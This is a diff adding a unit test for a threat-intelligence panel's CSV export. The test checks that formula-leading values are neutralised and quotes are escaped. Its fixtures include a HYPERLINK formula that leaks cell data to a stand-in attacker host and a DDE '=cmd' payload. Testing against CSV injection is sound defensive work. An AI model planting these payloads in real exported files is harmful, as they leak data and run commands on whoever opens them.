@@ -33,4 +33,40 @@ describe('ThreatIntelligencePanelComponent', () => {
   it('is created', () => {
     expect(component).toBeTruthy();
   });
+
+  describe('exportIndicatorCsv', () => {
+    let lastBlob: Blob | null;
+
+    beforeEach(() => {
+      lastBlob = null;
+      spyOn(URL, 'createObjectURL').and.callFake((blob: Blob) => {
+        lastBlob = blob;
+        return 'blob:stub';
+      });
+      spyOn(URL, 'revokeObjectURL').and.stub();
+      spyOn(HTMLAnchorElement.prototype, 'click').and.stub();
+    });
+
+    it('neutralises formula-leading feed values and doubles embedded quotes', async () => {
+      // Indicator content is adversary-controlled: a seeded MISP/OpenCTI
+      // indicator can carry a spreadsheet formula or a quote that breaks the row.
+      component.indicatorRows = [
+        { source: 'MISP', type: 'comment "x"', value: '=HYPERLINK("http://attacker/"&A1,"click")', confidence: 50, lastUpdated: '2026-10-01' },
+        { source: 'OpenCTI', type: 'domain', value: "=cmd|' /C calc'!A0", confidence: 80, lastUpdated: '-1' },
+      ];
+      component.exportIndicatorCsv();
+      expect(lastBlob).not.toBeNull();
+      const csv = await lastBlob!.text();
+      const lines = csv.split('\n');
+      expect(lines[0]).toBe('Source,Type,Value,Confidence,Last Updated');
+      expect(lines[1]).toBe('"MISP","comment ""x""","\'=HYPERLINK(""http://attacker/""&A1,""click"")",50,"2026-10-01"');
+      expect(lines[2]).toBe('"OpenCTI","domain","\'=cmd|\' /C calc\'!A0",80,"\'-1"');
+      // No data cell may start with a formula trigger.
+      for (const line of lines.slice(1)) {
+        for (const cell of line.split(',')) {
+          expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@]/);
+        }
+      }
+    });
+  });
 });
